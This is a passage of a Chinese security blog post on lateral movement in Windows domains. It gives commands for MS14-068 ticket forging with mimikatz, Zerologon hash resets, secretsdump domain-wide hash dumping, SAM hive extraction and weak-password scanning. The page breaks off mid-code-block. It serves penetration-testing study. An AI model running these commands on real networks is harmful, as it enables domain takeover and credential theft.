@@ -1,0 +1,899 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=light>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/avatar.png">
+  <link rel="icon" href="/img/avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="守心">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="域内漏洞   漏洞 类型    MS17-010 普通漏洞-横向移动   MS14-068 域提权漏洞   CVE-2020-1472 NetLogon 权限提升漏洞 域提权漏洞   CVE-2021-1675 Windows Print Spooler 权限提升漏洞 域提权漏洞   MS17-010MS14-068漏洞介绍KDC 无法正确检查 ST 中的 PAC 的有效签名，导致用户可以自己构造">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="https://liancccc.github.io/2024/09/15/%E6%8A%80%E6%9C%AF/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="liancccc&#39;s blog">
+<meta property="og:description" content="域内漏洞   漏洞 类型    MS17-010 普通漏洞-横向移动   MS14-068 域提权漏洞   CVE-2020-1472 NetLogon 权限提升漏洞 域提权漏洞   CVE-2021-1675 Windows Print Spooler 权限提升漏洞 域提权漏洞   MS17-010MS14-068漏洞介绍KDC 无法正确检查 ST 中的 PAC 的有效签名，导致用户可以自己构造">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1652260395_627b7e2b61c4153d1430e.png!small">
+<meta property="article:published_time" content="2024-09-15T13:23:28.000Z">
+<meta property="article:modified_time" content="2026-03-03T04:43:49.850Z">
+<meta property="article:author" content="守心">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1652260395_627b7e2b61c4153d1430e.png!small">
+  
+  
+  
+  <title>横向移动 - liancccc&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/font.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"liancccc.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 50vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>liulipo&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/lbxx.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="横向移动"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-15 21:23" pubdate>
+          2024年9月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">横向移动</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="域内漏洞"><a href="#域内漏洞" class="headerlink" title="域内漏洞"></a>域内漏洞</h2><table>
+<thead>
+<tr>
+<th>漏洞</th>
+<th>类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MS17-010</td>
+<td>普通漏洞-横向移动</td>
+</tr>
+<tr>
+<td>MS14-068</td>
+<td>域提权漏洞</td>
+</tr>
+<tr>
+<td>CVE-2020-1472 NetLogon 权限提升漏洞</td>
+<td>域提权漏洞</td>
+</tr>
+<tr>
+<td>CVE-2021-1675 Windows Print Spooler 权限提升漏洞</td>
+<td>域提权漏洞</td>
+</tr>
+</tbody></table>
+<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>KDC 无法正确检查 ST 中的 PAC 的有效签名，导致用户可以自己构造一张高权限的 PAC 并通过校验。</p>
+<p>PAC 包含两个签名，上面有介绍，它们分别使用的是服务秘钥和 KDC 秘钥进行签名，由于这个签名允许使用所有的 checksum 算法，包括 MD5，而 MD5 是不需要使用 key 的，所以我们就可以去修改 PAC 的内容，再使用 MD5 去生成一个服务校验和和 KDC 校验和来通过 KDC 的校验。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用条件：</p>
+<ul>
+<li>域控没有 KB3011780 补丁</li>
+<li>有一个域内的账户名和密码</li>
+</ul>
+<p>工具地址：<a target="_blank" rel="noopener" href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取用户SID</span><br>whoami /all<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">伪造票据 成功后会生成一个 .ccache 格式的票据</span><br>MS14-068.exe -u username@domain -p password -s user_sid -d 域控<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">mimikatz 注入票据</span><br>mimikatz.exe &quot;kerberos::purge&quot; &quot;kerberos::list&quot; &quot;kerboseos::ptc 票据&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">清除票据</span><br>kerberos::purge<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看是否清除成功</span><br>kerberos::list<br><span class="hljs-meta prompt_"># </span><span class="language-bash">注入票据</span><br>kerboseos::ptc 票据<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">测试, 可以利用 psexec 等工具进行命令执行</span><br>dir \\域控\C$<br></code></pre></td></tr></table></figure>
+
+<h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><h4 id="漏洞介绍-1"><a href="#漏洞介绍-1" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>在 2020 年 8 月份微软公布的安全公告中，有一个十分紧急的漏洞——CVE-2020-1472 NetLogon 权限提升漏洞。</p>
+<p>通过该漏洞，未经身份的验证者只需要能访问到域控的 135 端口即可通过使用 Netlogon 远程协议（MS-NRPC）连接域控制器并重置域控的机器账号的哈希，从而导致攻击者可以通过域控的机器账号导出域内所有用户哈希（ 域控的机器账号具有 Dcsync 权限，使用 Dcsync 导出域内哈希，需要域控开启 445 端口），进而接管整个域。</p>
+<p>所以这个漏洞完整的利用，需要域控开启 135 和 445 端口。</p>
+<p>影响版本：</p>
+<ul>
+<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1</li>
+<li>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2012 (Server Core installation)</li>
+<li>Windows Server 2012 R2</li>
+<li>Windows Server 2012 R2 (Server Core installation)</li>
+<li>Windows Server 2016</li>
+<li>Windows Server 2016 (Server Core installation)</li>
+<li>Windows Server 2019</li>
+<li>Windows Server 2019 (Server Core installation)</li>
+<li>Windows Server, version 1903 (Server Core installation)</li>
+<li>Windows Server, version 1909 (Server Core installation)</li>
+<li>Windows Server, version 2004 (Server Core installation)</li>
+</ul>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用流程：</p>
+<ol>
+<li>检测漏洞</li>
+<li>重置域控 Hash 为空</li>
+<li>impacket secretsdump.py 导出域内所有 Hash，使用这些 Hash 可以进行 PTH</li>
+<li>从域控 SAM 中提取原始 Hash 去复原域控 Hash</li>
+</ol>
+<p>漏洞检测：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a></p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">pip</span> install -r requirements.txt<br><span class="hljs-comment"># 域控 NetBIOS 名称和 IP 地址</span><br>python zerologon_tester.py EXAMPLE-DC <span class="hljs-number">1.2.3.4</span><br></code></pre></td></tr></table></figure>
+
+<p>重置域控 Hash：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472">https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">设置为空：NTLM <span class="hljs-built_in">hash</span> = 31d6cfe0d16ae931b73c59d7e0c089c0</span><br>python3 CVE-2020-1472.py AD01 AD01$ 10.211.55.4<br></code></pre></td></tr></table></figure>
+
+<p>impacket 导出域内所有 Hash：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">导出 Hash</span><br>python secretsdump.py &#x27;domain/dc_NetBIOS_name$@dc_ip_addr&#x27; -no-pass<br>python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 &#x27;domain/dc_NetBIOS_name$@dc_ip_addr&#x27;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">横向移动执行命令</span><br>python wmiexec.py ... <br></code></pre></td></tr></table></figure>
+
+<p>恢复域控 Hash：</p>
+<p>在攻击成功后，一定要恢复域控的机器用户的原始哈希，不然可能会出现域控重启后无法开机、脱域等情况！</p>
+<p>其原因在于我们是将 ntds.dit 中的域控机器密码置为空了，但是域控本地注册表和 lsass 进程中的密码并没有改变，这就导致了机器用户在 AD 中的密码与本地的注册表和 lsass 进程里面的密码不一致，所以可能会出现域控重启后无法开机、脱域等情况。</p>
+<p>因为本地的并没有变化，所以就可以从 SAM 中提取原来域控的 Hash：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">导出 SAM 文件</span><br>reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">impacket 下载文件</span><br>get system.save<br>get sam.save<br>get security.save<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除</span><br>del /f system.save<br>del /f sam.save<br>del /f security.save<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">获取原来的 Hash, <span class="hljs-variable">$MACHINE</span>.ACC 后面的就是</span><br>python secretsdump.py -sam sam.save -system system.save -security security.save LOCAL<br></code></pre></td></tr></table></figure>
+
+<p>还原 Hash：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/risksense/zerologon">https://github.com/risksense/zerologon</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">还原 Hash</span><br>python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR ORIG_NT_HASH<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看域控</span><br>python3 secretsdump.py &#x27;domain/dc_NetBIOS_name$@dc_ip_addr&#x27; -just-dc-user &#x27;TEST-AD$&#x27;<br></code></pre></td></tr></table></figure>
+
+<h3 id="CVE-2021-1675"><a href="#CVE-2021-1675" class="headerlink" title="CVE-2021-1675"></a>CVE-2021-1675</h3><h4 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>Print Spooler 是 Windows 系统中用于管理打印相关事务的服务，在 Windows 系统中用于后台执行打印作业并处理与打印机的交互，该服务管理所有本地和网络打印队列及控制所有打印工作。</p>
+<p>该服务对应的进程 spoolsv.exe 以 SYSTEM 权限执行。其设计中存在的一个严重缺陷，由于 SeLoadDriverPrivilege 中鉴权存在代码缺陷，参数可以被攻击者控制，普通用户可以通过 RPC 触发 RpcAddPrinterDrive 绕过安全检查并写入恶意驱动程序。</p>
+<p>如果域控存在此漏洞，域中普通用户即可通过远程连接域控 Spooler 服务，向域控中添加恶意驱动，从而控制整个域环境。</p>
+<p><img src="https://blog-1310215391.cos.ap-beijing.myqcloud.com/images/1652260395_627b7e2b61c4153d1430e.png!small" srcset="/img/loading.gif" lazyload alt="img">​</p>
+<p>影响版本：</p>
+<ul>
+<li>Windows 7</li>
+<li>Windows 8.1</li>
+<li>Windows Server 2008</li>
+<li>Windows Server 2012</li>
+<li>Windows Server 2016</li>
+<li>Windows Server 2019</li>
+<li>Windows 10</li>
+</ul>
+<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>impacket 检测 MS-RPRN 服务是否开启：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> rpcdump.<span class="hljs-keyword">py</span> @<span class="hljs-number">10.211</span>.<span class="hljs-number">55.14</span> | <span class="hljs-keyword">grep</span> MS-RPRN<br></code></pre></td></tr></table></figure>
+
+<h2 id="产品漏洞"><a href="#产品漏洞" class="headerlink" title="产品漏洞"></a>产品漏洞</h2><h4 id="vcenter"><a href="#vcenter" class="headerlink" title="vcenter"></a>vcenter</h4><p>待补充</p>
+<h2 id="服务漏洞"><a href="#服务漏洞" class="headerlink" title="服务漏洞"></a>服务漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42253265/article/details/122945413">https://blog.csdn.net/weixin_42253265/article/details/122945413</a></p>
+<p>服务漏洞这里主要就是利用 fscan、Landon 等工具扫到的弱口令，利用弱口令进行进一步的横向移动。</p>
+<p>在拿到新密码后就可以再进行一次服务口令的扫描，比如翻到数据库配置文件、web 弱口令、抓密码等等。</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>22</td>
+<td>SSH</td>
+</tr>
+<tr>
+<td>1433</td>
+<td>MSSQL</td>
+</tr>
+<tr>
+<td>1521</td>
+<td>Oracle</td>
+</tr>
+<tr>
+<td>3306</td>
+<td>MySQL</td>
+</tr>
+<tr>
+<td>3389</td>
+<td>RDP</td>
+</tr>
+<tr>
+<td>5432</td>
+<td>PostgreSQL</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+</tr>
+</tbody></table>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">fscan</span> -h host -p <span class="hljs-number">22</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">6379</span> -np -nopoc -pwda &#x27;password&#x27;<br><br><span class="hljs-attribute">fscan</span> -h host -p <span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">6379</span> -np -nopoc <br></code></pre></td></tr></table></figure>
+
+<p>待整理….</p>
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>横向移动比较常见的就是 PTH 攻击，也就是 Hash 传递，由于在 NTLM 和 Kerberos 认证过程中都是使用用户密码的 NTLM Hash 来进行加密，没有用到明文密码，所以可以直接利用 NTLM Hash 来进行认证。</p>
+<p>在拿到对方的 NTLM Hash 或者明文密码后，就可以利用该凭证去碰撞域内其他机器，实现横向移动，一般在域环境下，相同密码是很多的。明文密码可以直接对其他服务进行碰撞比如数据库等也可以实现横向移动。</p>
+<table>
+<thead>
+<tr>
+<th>端口</th>
+<th>工具</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>135</td>
+<td>wmihacker, sharpwmi</td>
+<td>wmi 注册表回显</td>
+</tr>
+<tr>
+<td>135,445</td>
+<td>wmiexec, wmiexec.vbs</td>
+<td>wmi smb 回显</td>
+</tr>
+<tr>
+<td>139,445</td>
+<td>atexec, psexec, smbexec</td>
+<td>smb</td>
+</tr>
+<tr>
+<td>5985,5986</td>
+<td>winrm</td>
+<td>winrm</td>
+</tr>
+</tbody></table>
+<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>为了更好的报告本地管理员组中的用户，微软在网络上实现了 UAC 限制机制，当内置的 administrator 进行远程连接时会直接得到具有管理员凭证的令牌，而非 administrator 的本地管理员账户进行远程连接时，会得到一个删除了管理员凭证的令牌。</p>
+<p>在横向移动时，关于 administrator 账号和普通管理员组中账号的一些区别，涉及到 LocalAccountTokenFilterPolicy 值。</p>
+<p>在 Windows Vista 以后的操作系统中，默认没有 LocalAccountTokenFilterPolicy 注册表值，其引入了一种默认开启的<a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/help/951016/description-of-user-account-control-and-remote-restrictions-in-windows">remote UAC</a>，计算机的任何非 SID 500 本地管理员帐户，用户在远程计算机上没有特权提升能力，并且用户无法执行管理任务。</p>
+<p>这种情况下内置的管理员账户 administrator 进行远程连接时会直接得到具有管理员凭证的令牌，而非 administrator 的本地管理员账户进行远程连接时，会得到一个删除了管理员凭证的令牌。</p>
+<p>而域用户不受此影响。也就是说，在工作组环境中，只有 administrator 账号才能建立具备管理员权限的远程连接，其他本地管理员账户建立需要管理员权限的远程连接时会提示权限不足。</p>
+<p>而在域环境中，只要是域管理员都可以建立具备管理员权限的远程连接。所以，在域环境中，远程连接域控可以使用域管理员，远程连接普通域主机可以使用普通域成员。</p>
+<p>而在工作组环境中，远程连接主机只能使用 administrator 账号，而不能使用其他管理员账号。</p>
+<p><strong>简单来说就是工作组环境下，我们拿到对方非 administrator 用户的账号密码，是无法进行 ps,smb,wmi 等进行横向移动的。</strong></p>
+<p>看了下绕过这种限制的方法，无一例外都是需要对方去操作从而给 LocalAccountTokenFilterPolicy 赋值，但是这就没有多大意义了，本身就是横向移动，都能执行命令了，还横向干嘛。</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6888?time__1311=n4+xnD0Dg7nE3DsAYxCqrrDcDjow7A7aoD">https://xz.aliyun.com/t/6888?time__1311=n4%2BxnD0Dg7nE3DsAYxCqrrDcDjow7A7aoD</a></p>
+<p>PTH 的主要手法就是抓本台机器的密码，然后利用抓到的 Hash 或者明文密码去碰撞其他机器，成功后再重复该操作。直到可以横向到域控，或者拿下域管理员的 Hash。</p>
+<h3 id="135-端口"><a href="#135-端口" class="headerlink" title="135 端口"></a>135 端口</h3><p>wmic 是 windows 管理仪表命令行（ Windows Management Instrumentation Command-line ）的简称，它是一款命令行管理工具，提供了从命令行接口到批量命令脚本执行系统管理的支持，可以说是 Windows 平台下最有用的命令行工具。</p>
+<p>使用 wmic ，我们不但可以管理本地计算机，还可以管理统一局域网内的所有远程计算机（需要必要的权限），而被管理的计算机不必事先安装 wmic 。自<br>Windows98 开始，Windows 操作系统都支持 wmic，wmic 是一系列工具集组成的。</p>
+<p>在用 wmic 执行命令过程中，操作系统默认不会将 wmic 的操作记录在日志中，因此在这个过程中不会产生日志，只会在登录的时候产生登录日志。所以越来越多的攻击者由 psexec、smbexec 转向 wmic 。</p>
+<p>wmic 的使用需要对方开启 135 端口和 admin$ 共享，135 端口是 wmic 默认的管理端口。</p>
+<p>impacket 下的 wmiexec.py 脚本，需要 135 端口和 445 端口同时开启并且需要 admin$ 共享。</p>
+<p>135 端口用 RPC 来执行命令，445 端口用来读取回显。准确说、如果要把输出结果写⽂件的话，需要用 smb 回传。</p>
+<p>如果写注册表的话，直接用 wmi 就能回来了，就不需要⾛ 445 了。</p>
+<p>SharpWmi 和 WmiHacker 这两个项目就是利用注册表来读取执行结果，因此只需要 135 端口和 admin$ 共享即可，不需要 445 端口。优点是免杀性能，缺点就是需要明文密码而非 Hash。</p>
+<p>不过好的是有前辈实现了该功能并且提交 crackMapExec 了 ，目前已经集成了这个功能了：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2329497">https://cloud.tencent.com/developer/article/2329497</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/pull/657">https://github.com/byt3bl33d3r/CrackMapExec/pull/657</a></li>
+</ul>
+<h3 id="445-端口"><a href="#445-端口" class="headerlink" title="445 端口"></a>445 端口</h3><p>SMB（Server Message Block，服务器消息块），又称 CIFS（Common Internet File System，网络文件共享系统），主要功能是使网络上的计算机能够共享计算机文件、打印机、串行端口和通信等资源。</p>
+<p>SMB 消息一般使用 NetBIOS 协议或 TCP 发送，分别使用端口 139 或 445，目前倾向于使用 445 端口。</p>
+<h4 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h4><p>IPC$ (Internet Process Connection) 是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问。</p>
+<p>IPC$是 NT2000 的一项新功能，它有一个特点，即在同一时间内，两个 IP 之间只允许建立一个连接。</p>
+<p>NT2000 在提供了 IPC$共享功能的同时，在初次安装系统时还打开了默认共享，即所有的逻辑共享(C$、D$、E$……)和系统目录共享(admin$)，但要注意，这些共享是隐藏的，只有管理员能够对他们进行远程操作。</p>
+<p><strong>所以非管理员用户建立连接后的权限很低，仅能执行查看时间的命令，也就是非管理员建立连接是无法进行横向移动的。</strong></p>
+<p>不过不管是连接或者是被连接，都相当于双方建立连接，所以是可以双向进行操作的。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 